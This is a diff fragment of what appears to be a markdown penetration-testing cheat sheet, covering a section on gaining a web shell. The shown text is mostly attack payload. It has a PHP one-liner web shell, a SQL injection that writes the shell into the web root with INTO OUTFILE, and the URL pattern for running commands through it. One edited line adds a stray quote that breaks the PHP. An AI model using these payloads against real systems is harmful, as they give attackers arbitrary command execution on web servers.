@@ -58,10 +58,10 @@
 
 ### Gain a web shell
 #
-* <<? system($_REQUEST['cmd']); ?>>
+* <? "system($_REQUEST['cmd']); ?>
 * Create a file onm the server with a nonexistant user:
     * SELECT Password FROM Users WHERE Username='abc'
       UNION SELECT "<? system($_REQUEST['cmd']); ?>"
       INTO OUTFILE "/var/www/html/shell.php"
     * Password is blank, so you can upload that cmd script then visit that scripts URL to execute it.
-        * http://www.example.com/shell.php?cmd=COMMAND
+        * <http://www.example.com/shell.php?cmd=COMMAND>
